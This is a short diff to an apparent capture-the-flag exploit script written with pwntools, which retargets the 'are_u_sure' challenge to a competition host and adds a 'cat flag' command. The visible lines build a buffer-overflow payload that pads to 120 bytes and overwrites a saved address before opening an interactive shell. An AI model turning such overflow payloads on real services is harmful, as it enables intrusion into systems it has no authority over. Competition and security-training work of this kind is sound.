@@ -1,7 +1,7 @@
 #!/usr/bin/env python2
 from pwn import *
 
-host = "67.205.174.218"
+host = "csgames-quals.frigon.app"
 port = 8001
 binary_path = "./are_u_sure"
 lib_path = None
@@ -38,6 +38,8 @@ payload = payload.ljust(120, 'A')
 payload += p64(name_addr - 0x30)
 
 p.sendlineafter("ARE YOU SURE YOU'RE UP FOR THE CHALLENGE ?!?!\n", payload)
+
+p.sendline("cat flag")
 
 p.interactive()
 
